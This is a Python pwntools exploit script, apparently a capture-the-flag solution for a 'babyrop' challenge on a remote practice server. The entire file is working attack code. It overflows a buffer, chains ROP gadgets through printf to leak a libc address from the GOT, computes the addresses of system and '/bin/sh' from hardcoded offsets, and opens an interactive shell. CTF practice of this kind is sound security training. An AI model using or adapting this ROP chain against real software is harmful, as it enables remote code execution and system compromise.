from pwn import *


_FILE = "./babyrop"

#p = process(_FILE)
p = remote("pwnremote.threatsims.com", 9001)

binary = ELF(_FILE, checksec=False)
#gdb.attach(p.pid)


rop = ROP(binary)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]

pop_rsi = rop.find_gadget(["pop rsi"])[0]

printf_plt = binary.plt['printf']

main = binary.sym["vuln"]

payload = cyclic(40, n=8)

def leak_payload(func):
    pay = p64(pop_rdi) + p64(binary.got[func]) + p64(pop_rsi) + p64(0x400714) + p64(0x0) + p64(printf_plt) + p64(main)
    return pay


p.clean()

payload += leak_payload("setvbuf")

p.sendline(payload)

sleep(1)

leaked_printf = u64(p.clean().decode("latin-1").ljust(8, "\x00"))


payload = cyclic(40, n=8)

'''

payload += leak_payload("setvbuf")

p.clean()

p.sendline(payload)

leaked_printf = u64(p.recvline().decode("latin-1").split("Simple")[0].ljust(8, "\x00"))

'''
log.info(f"Leaked printf: {hex(leaked_printf)}")


#log.info(f"Leaked printf: {hex(leaked_printf)}")

addr = 0x087e60

system = leaked_printf - addr + 0x055410
binsh = leaked_printf - addr + 0x1b75aa

payload += p64(pop_rdi) + p64(binsh) + p64(system) + p64(main)

p.sendline(payload)

p.interactive()
